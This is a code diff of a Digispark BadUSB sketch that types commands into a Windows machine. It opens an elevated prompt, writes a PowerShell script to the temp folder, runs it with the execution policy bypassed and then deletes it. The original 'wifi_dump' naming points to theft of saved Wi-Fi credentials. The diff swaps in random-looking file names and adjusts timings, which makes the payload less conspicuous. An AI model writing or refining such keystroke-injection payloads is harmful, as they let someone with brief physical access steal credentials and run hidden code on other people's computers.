@@ -7,22 +7,22 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.delay(800);
   DigiKeyboard.sendKeyStroke(KEY_A);
-  DigiKeyboard.delay(2800);
+  DigiKeyboard.delay(2500);
 
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.delay(800);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2200);
+  DigiKeyboard.delay(2800);
 
   DigiKeyboard.print(F("cmd"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1800);
 
-  DigiKeyboard.print(F("set TEMP_TXT=%TEMP%\\wifi_dump.txt"));
+  DigiKeyboard.print(F("set TEMP_TXT=%TEMP%\\iwudhwow.txt"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(800);
 
-  DigiKeyboard.print(F("set TEMP_PS1=%TEMP%\\wifi_dump.ps1"));
+  DigiKeyboard.print(F("set TEMP_PS1=%TEMP%\\iwudhwow.ps1"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
 
@@ -63,16 +63,16 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
 
-  DigiKeyboard.print(F("rename %TEMP_TXT% wifi_dump.ps1"));
+  DigiKeyboard.print(F("rename %TEMP_TXT% iwudhwow.ps1"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
 
   // Executa o script PowerShell
-  DigiKeyboard.print(F("powershell -ExecutionPolicy Bypass -File %TEMP%\\wifi_dump.ps1"));
+  DigiKeyboard.print(F("powershell -ExecutionPolicy Bypass -File %TEMP%\\iwudhwow.ps1"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(6000);
 
-  DigiKeyboard.print(F("del %TEMP%\\wifi_dump.ps1"));
+  DigiKeyboard.print(F("del %TEMP%\\iwudhwow.ps1"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(6000);
 
